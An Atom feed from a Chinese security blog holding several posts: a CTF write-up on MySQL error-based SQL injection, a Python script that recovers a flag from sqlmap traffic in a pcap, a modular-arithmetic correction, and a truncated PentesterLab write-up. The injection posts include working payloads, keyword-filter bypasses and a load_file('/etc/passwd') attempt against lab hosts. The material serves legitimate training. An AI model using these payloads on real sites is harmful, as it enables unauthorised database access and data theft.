<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  
  <title><![CDATA[Hc1m1]]></title>
  <subtitle><![CDATA[Blog]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://0x48.pw//"/>
  <updated>2016-04-08T11:49:54.908Z</updated>
  <id>http://0x48.pw//</id>
  
  <author>
    <name><![CDATA[Hcamael]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[MySQLi-Error Injection]]></title>
    <link href="http://0x48.pw/2016/04/08/0x18/"/>
    <id>http://0x48.pw/2016/04/08/0x18/</id>
    <published>2016-04-08T09:52:02.000Z</published>
    <updated>2016-04-08T11:49:54.908Z</updated>
    <content type="html"><![CDATA[<p>本篇文章源于一道三个白帽的题目</p>
<a id="more"></a>
<p>该题源码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> <span class="variable">$key</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$key</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array(<span class="variable">$v</span>))&#123;</span><br><span class="line">            errorBox(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$k</span>[<span class="number">0</span>] !=<span class="string">'_'</span>?<span class="variable">$$k</span> = addslashes(<span class="variable">$v</span>):<span class="variable">$$k</span> = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">(<span class="variable">$str</span>)</span></span>&#123;</span><br><span class="line">    <span class="variable">$rstr</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$str</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ord(<span class="variable">$str</span>[<span class="variable">$i</span>])&gt;<span class="number">31</span> &amp;&amp; ord(<span class="variable">$str</span>[<span class="variable">$i</span>])&lt;<span class="number">127</span>)&#123;</span><br><span class="line">            <span class="variable">$rstr</span> = <span class="variable">$rstr</span>.<span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$rstr</span> = str_replace(<span class="string">'\''</span>,<span class="string">''</span>,<span class="variable">$rstr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$rstr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$message</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/\b(select|insert|update|delete)\b/i"</span>,<span class="variable">$message</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(filter(<span class="variable">$message</span>) !== <span class="variable">$message</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">"insert guestbook(`message`) value('$message');"</span>;</span><br><span class="line">    mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"select * from guestbook order by id limit 0,5;"</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$id</span> = <span class="variable">$row</span>[<span class="string">'id'</span>];</span><br><span class="line">            <span class="variable">$message</span> = <span class="variable">$row</span>[<span class="string">'message'</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"|$id|=&gt;|$message|&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$message</span> = stripcslashes(<span class="variable">$message</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"delete from guestbook where id=$id or message ='$message';"</span>;</span><br><span class="line">    <span class="keyword">if</span>(!mysql_query(<span class="variable">$sql</span>))&#123;</span><br><span class="line">        <span class="keyword">print</span>(mysql_error());</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">"delete from guestbook where id=$id"</span>;</span><br><span class="line">        mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这题读完一遍源码之后，就知道需要bypass单引号和<code>preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message)</code>， 然后是二次注入+报错注入.</p>
<p>bypass单引号是借助<code>stripcslashes($message);</code>该函数，所以使用<code>?message=aaa\x27</code> 来bypass单引号，这不是本篇重点，就不多说了。</p>
<p>然后使用<code>/*!00000select*/</code> 来bypass <code>preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message)</code></p>
<p><code>/*!*/</code> 只在mysql中有用，在别的数据库中这只是注释，但是在mysql，<code>/*!select 1*/</code>可以成功执行，在语句前可以加上5位数字，代表版本号，表示只有在大于该版本的mysql中不作为注释<br>eg:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql&gt; select version();</span><br><span class="line">+-----------+</span></span><br><span class="line"><span class="header">| version() |</span><br><span class="line">+-----------+</span></span><br><span class="line"><span class="header">| 5.7.9-log |</span><br><span class="line">+-----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="header">mysql&gt; select /*!50709version()*/;</span><br><span class="line">+-----------+</span></span><br><span class="line"><span class="header">| version() |</span><br><span class="line">+-----------+</span></span><br><span class="line"><span class="header">| 5.7.9-log |</span><br><span class="line">+-----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select /<span class="strong">*!50710version()*</span>/;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1</span><br></pre></td></tr></table></figure></p>
<p>好了，现在可以进行注入了，因为有一句<code>print(mysql_error());</code>，所以可以报错注入了：<br><del>报错注入是从写bug中发现的么？</del></p>
<h2 id="使用updatexml">使用updatexml</h2><p>payload:<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27 and updatexml<span class="params">(<span class="number">0</span>,concat<span class="params">(<span class="number">0</span>x27,<span class="params">(/*!<span class="number">00000</span>select version<span class="params">()</span>*/)</span>)</span>,<span class="number">0</span>)</span><span class="built_in">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p><code>UpdateXML(xml_target, xpath_expr, new_xml)</code><br>updatexml函数有三个参数，作用是xml替换，把<code>xml_target</code>中被<code>xpath_expr</code>匹配到的部分使用<code>new_xml</code>替换</p>
<p>这个报错注入的原理是利用updatexml的参数错误，首先不能有语法错误，要不然注入的语句根本无法执行，语法正确后，先去执行<code>concat(0x27,(/*!00000select version()*/))</code>,得到<code>&#39;5.5.42-log</code>,作为第二个参数传入updatexml函数中，而updatexml第二个参数为xml的匹配表达式，单引号为非法字符，因此报错，输出错误内容<code>&#39;5.5.42-log</code>, 因此得到了你想要得到的数据</p>
<h2 id="使用ExtractValue()">使用ExtractValue()</h2><p>payload:<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27 and ExtractValue<span class="params">(<span class="number">0</span>,concat<span class="params">(<span class="number">0</span>x27,<span class="params">(/*!<span class="number">00000</span>select version<span class="params">()</span>*/)</span>)</span>)</span><span class="built_in">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>这个同理上面的，不过区别是<br><code>ExtractValue(xml_frag, xpath_expr)</code> 得到<code>xml_frag</code>中被<code>xpath_expr</code>匹配到的值</p>
<p>不过extractvalue和updatexml有个缺陷是，报错数据最大长度为32</p>
<h2 id="使用name_const">使用name_const</h2><p>payload:<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27<span class="built_in">%</span><span class="number">20</span>and<span class="built_in">%</span><span class="number">20</span><span class="params">(/*!<span class="number">00000</span>SELECT*/ * FROM<span class="params">(/*!<span class="number">00000</span>SELECT*/<span class="params">(name_const<span class="params">(version<span class="params">()</span>,<span class="number">1</span>)</span>)</span>,name_const<span class="params">(version<span class="params">()</span>,<span class="number">1</span>)</span>)</span>a)</span><span class="built_in">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql&gt; select name_const('a','b');</span><br><span class="line">+------+</span></span><br><span class="line"><span class="header">| a    |</span><br><span class="line">+------+</span></span><br><span class="line"><span class="header">| b    |</span><br><span class="line">+------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; /<span class="strong">*!00000SELECT*</span>/(name<span class="emphasis">_const(version(),1)),name_</span>const(version(),1); <span class="code">+-----------+</span>-----------+</span><br><span class="line"><span class="header">| 5.7.9-log | 5.7.9-log |</span><br><span class="line">+-----------+-----------+</span></span><br><span class="line"><span class="header">|         1 |         1 |</span><br><span class="line">+-----------+-----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>本题利用的是表的字段名不允许重复，报错长度没有限制</p>
<h2 id="利用exp报错">利用exp报错</h2><p>payload:<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27 and (/<span class="keyword">*</span>!00000select exp(~(/<span class="keyword">*</span>!00000select<span class="keyword">*</span>/ <span class="keyword">*</span> from (/<span class="keyword">*</span>!00000select<span class="keyword">*</span>/ version())a)))%23</span><br></pre></td></tr></table></figure></p>
<p>利用double型溢出，可参考<a href="http://drops.wooyun.org/tips/8166" target="_blank" rel="external">http://drops.wooyun.org/tips/8166</a></p>
<h2 id="利用floor报错">利用floor报错</h2><p>可参考<a href="http://www.jinglingshu.org/?p=4507" target="_blank" rel="external">http://www.jinglingshu.org/?p=4507</a>, 对于<code>floor</code> 报错注入我理解的不是特别透彻</p>
<h2 id="利用join报错">利用join报错</h2><p><code>join</code> 可用来报列名，同样可参考上面那个链接，本题不是一个很好的join报错案例</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本篇文章源于一道三个白帽的题目</p>]]>
    
    </summary>
    
      <category term="SQLi" scheme="http://0x48.pw/tags/SQLi/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python 使用dpkt分析数据包]]></title>
    <link href="http://0x48.pw/2016/04/04/0x17/"/>
    <id>http://0x48.pw/2016/04/04/0x17/</id>
    <published>2016-04-04T14:50:47.000Z</published>
    <updated>2016-04-04T15:29:28.216Z</updated>
    <content type="html"><![CDATA[<p>上周Lightless放了一题数据包分析的题，挺有意思的</p>
<a id="more"></a>
<p>题目地址: <a href="http://7xscw6.com1.z0.glb.clouddn.com/hahaha.pcapng" target="_blank" rel="external">http://7xscw6.com1.z0.glb.clouddn.com/hahaha.pcapng</a></p>
<p>数据包分析这部分很简单，随便看看可以看出来这是个用sqlmap去艹服务器的数据包，然后flag使用盲注注出来的.</p>
<p>最简单的方法就是手工把盲注的包提取出来，手工分析得到flag.</p>
<p>不过我觉得手工太low了，所以有了这篇文章，使用Python的dpkt包对pcap包进行分析.</p>
<p>直接先贴代码：<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dpkt.ethernet <span class="keyword">import</span> <span class="type">Ethernet</span></span><br><span class="line"><span class="keyword">import</span> dpkt</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="literal">result</span> = []</span><br><span class="line">f = file(<span class="string">"test.pcapng"</span>)</span><br><span class="line">pcap = dpkt.pcapng.<span class="type">Reader</span>(f)</span><br><span class="line">(ts, buf) = pcap.next()</span><br><span class="line"><span class="keyword">while</span> <span class="type">True</span>:</span><br><span class="line">    http_data = <span class="type">Ethernet</span>(buf).data.data.data</span><br><span class="line">    request = dpkt.http.<span class="type">Request</span>(http_data)</span><br><span class="line">    (ts, buf) = pcap.next()</span><br><span class="line">    http_data = <span class="type">Ethernet</span>(buf).data.data.data</span><br><span class="line">    response = dpkt.http.<span class="type">Response</span>(http_data)</span><br><span class="line">    payload = urllib.unquote(request.uri)</span><br><span class="line">    entity_body = response.entity_body</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"ctf.flag "</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"123456"</span> <span class="keyword">in</span> entity_body:</span><br><span class="line">            <span class="literal">result</span>.append(&#123;<span class="string">"payload"</span>: payload, <span class="string">"result"</span>: <span class="type">True</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="literal">result</span>.append(&#123;<span class="string">"payload"</span>: payload, <span class="string">"result"</span>: <span class="type">False</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        (ts, buf) = pcap.next()</span><br><span class="line">    <span class="keyword">except</span> <span class="type">StopIteration</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">number = <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="literal">result</span>:</span><br><span class="line">    [(x, h)] = re.findall(<span class="string">"1\),(\d+).+&gt;(\d+)"</span>, y['payload'])</span><br><span class="line">    x, h = <span class="type">int</span>(x), <span class="type">int</span>(h)</span><br><span class="line">    <span class="keyword">if</span> x &gt; number:</span><br><span class="line">        number = x</span><br><span class="line">        flag += chr(c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> y['<span class="literal">result</span>']:</span><br><span class="line">            c = h + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
<p>因为dpkt包的setfilter方法是没用的，感觉是作者还没把dpkt写完<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setfilter</span><span class="params">(self, value, optimize=<span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> NotImplementedError</span><br></pre></td></tr></table></figure></p>
<p>所以我用wireshark过滤出了http包：<a href="http://7xscw6.com1.z0.glb.clouddn.com/test.pcapng" target="_blank" rel="external">http://7xscw6.com1.z0.glb.clouddn.com/test.pcapng</a></p>
<p>然后由于http包实体内容使用了gzip压缩，所以我魔改了<code>http.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span><span class="params">(Message)</span>:</span></span><br><span class="line">    <span class="string">"""Hypertext Transfer Protocol Response."""</span></span><br><span class="line">    __hdr_defaults__ = &#123;</span><br><span class="line">        <span class="string">'version'</span>: <span class="string">'1.0'</span>,</span><br><span class="line">        <span class="string">'status'</span>: <span class="string">'200'</span>,</span><br><span class="line">        <span class="string">'reason'</span>: <span class="string">'OK'</span></span><br><span class="line">    &#125;</span><br><span class="line">    __proto = <span class="string">'HTTP'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        Message.__init__(self, *args, **kwargs)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            entity = gzip.Gzip(self.body)</span><br><span class="line">            self.entity_body = gzip.Gzip.decompress(entity)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            self.entity_body = <span class="string">""</span></span><br></pre></td></tr></table></figure></p>
<p>加了一个<code>__init__</code></p>
<p>然后，代码短，也容易看懂，不过还有需要优化的地方，不过跑这题确是没问题的</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>上周Lightless放了一题数据包分析的题，挺有意思的</p>]]>
    
    </summary>
    
      <category term="Python" scheme="http://0x48.pw/tags/Python/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CRYPTO技能修正]]></title>
    <link href="http://0x48.pw/2016/04/01/0x16/"/>
    <id>http://0x48.pw/2016/04/01/0x16/</id>
    <published>2016-04-01T11:57:39.000Z</published>
    <updated>2016-04-02T04:44:10.638Z</updated>
    <content type="html"><![CDATA[<p>关于前篇求模运算的修正<br><a id="more"></a></p>
<p>今天突然对模运算开窍了，这是上篇RSA总结中我对同余式的理解：<br><del></del></p>
<blockquote>
<p>x = y (mod n)   可以看成是   x % n = y<br>x $\equiv$ y (mod n)   可以看成是   x % n = y % n<br></p>
</blockquote>
<p><strong>是错误的！！！</strong></p>
<p>其实三等还是两等，都是一样的，比如，对于 $A\ \%\ N = B$,<br>我们可以很容易得到<br>$$x_1N + B = A$$<br>也可以是<br>$$x_2N + A = B$$<br>然后这两个式子就会给我们一个错觉推出，<br>$$x_1N + B = A  \Longrightarrow  A\ \%\ N = B\ (B = A\ (mod\ N))$$<br>$$x_2N + A = B \Longrightarrow  B\ \%\ N = A\ (A = B\ (mod\ N))$$</p>
<p><strong>看着好像没错的样子，其实错了一半！</strong></p>
<p>如果我们已知 $A\ \%\ N = B$, 我们可以推出$xN + B = A$没错，但是我们不能从而得到 <del>B % N = A</del>，可是上面推的貌似没问题？不，有问题！</p>
<p>$$xN + A = B\ \ \nRightarrow \ \ B\ \%\ N = A$$<br>这个推导是错误的！正确的应该是<br>$$xN + A = B \Longrightarrow B\ \%\ N = A\ \%\ N$$</p>
<p>这不就是同余式么: $A \equiv B(mod\ N)$</p>
<p>这里暗藏了一个等式，当我们已知$A\ \%\ N = B$ 时，我们可以确定$B = B\ \%\ N$, 所以这个时候就可以从 $xN + B = A$ 推导出 $A\ \%\ N = B$, 但是A却不一定等于$A\ \%\ N$, 所以并不能得到$B\ \%\ N = A$</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>关于前篇求模运算的修正<br>]]>
    
    </summary>
    
      <category term="密码学" scheme="http://0x48.pw/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Pentester Lab Writeup]]></title>
    <link href="http://0x48.pw/2016/03/21/0x15/"/>
    <id>http://0x48.pw/2016/03/21/0x15/</id>
    <published>2016-03-21T02:16:46.000Z</published>
    <updated>2016-03-28T10:18:37.294Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>玩了下exploit, 再来玩玩pentest。</p>
</blockquote>
<a id="more"></a>
<h1 id="SQLI">SQLI</h1><h2 id="Example_1">Example 1</h2><p>没做任何过滤，简单。。不过看了下，mysql的用户没啥权限，所以最多就是查看数据库信息了，没法读系统文件，写文件getshell。。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example1.php?name=admin<span class="number">%27</span><span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>version(),load_file(<span class="number">%22</span>/etc/passwd<span class="number">%22</span>),user(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2">Example 2</h2><p>这题就过滤了空格呗。。也简单。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/sqli/example2.php?name=root%27<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="operator"><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span>%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>SCHEMA_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.SCHEMATA%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>TABLE_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">TABLES</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=%<span class="number">22</span>exercises%<span class="number">22</span>%<span class="number">23</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_3">Example 3</h2><p>只能说上题的payload还能用。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example3.php?name=root%<span class="number">27</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="function">user</span>(),<span class="function">database</span>(),<span class="function">version</span>(),<span class="number">4</span>,<span class="number">5%</span><span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
<p>去看看源码。。看看这两题的过滤有啥区别。。<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//example2.php</span></span><br><span class="line"><span class="keyword">if</span> <span class="params">(preg_match<span class="params">('/ /', $_GET[<span class="string">"name"</span>])</span>)</span> &#123;</span><br><span class="line">		die<span class="params">(<span class="string">"ERROR NO SPACE"</span>)</span>;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//example3.php</span></span><br><span class="line"><span class="keyword">if</span> <span class="params">(preg_match<span class="params">('/\s+/', $_GET[<span class="string">"name"</span>])</span>)</span> &#123;</span><br><span class="line">		die<span class="params">(<span class="string">"ERROR NO SPACE"</span>)</span>;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>这过滤对我的payload并没有影响。。</p>
<h2 id="Example_4">Example 4</h2><p>换整型注入了。。一样。。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example4.php?id=2<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>user(),version(),database(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_5">Example 5</h2><p>上题的payload还是可以用，这题的过滤是要求0-9开头<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example5.php?id=2<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>user(),version(),database(),5,6<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_6">Example 6</h2><p>猜到了，这题是要求0-9结尾。。一样简单<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example6.php?id=2<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>user(),version(),database(),4,5<span class="number">%233</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_7">Example 7</h2><p>这题看了源码。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example7.php?id=2<span class="number">%0</span>aunion<span class="number">%20</span>select<span class="number">%20</span>version(),user(),database(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
<p>这题需要用%0a来bypass，因为。。看源码：<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="params">(!preg_match<span class="params">('/^-?[<span class="number">0</span>-<span class="number">9</span>]+$/m', $_GET[<span class="string">"id"</span>])</span>)</span> &#123;</span><br><span class="line">		die<span class="params">(<span class="string">"ERROR INTEGER REQUIRED"</span>)</span>;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>主要是最后的/m</p>
<blockquote>
